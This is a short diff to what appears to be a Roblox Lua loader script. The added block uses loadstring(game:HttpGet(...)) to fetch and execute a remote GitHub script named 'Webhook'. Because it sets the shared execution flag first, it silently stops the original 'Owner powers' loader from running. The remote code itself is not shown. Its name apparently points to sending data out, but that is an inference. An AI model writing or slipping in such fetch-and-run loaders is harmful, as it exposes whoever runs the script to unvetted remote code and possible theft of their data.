@@ -1,5 +1,9 @@
 if not _G.hasExecuted then
     _G.hasExecuted = true
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Webhook"))()
+end
+if not _G.hasExecuted then
+    _G.hasExecuted = true
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Alikhammass/MyAdmin/refs/heads/main/Owner%20powers"))()
 end
 
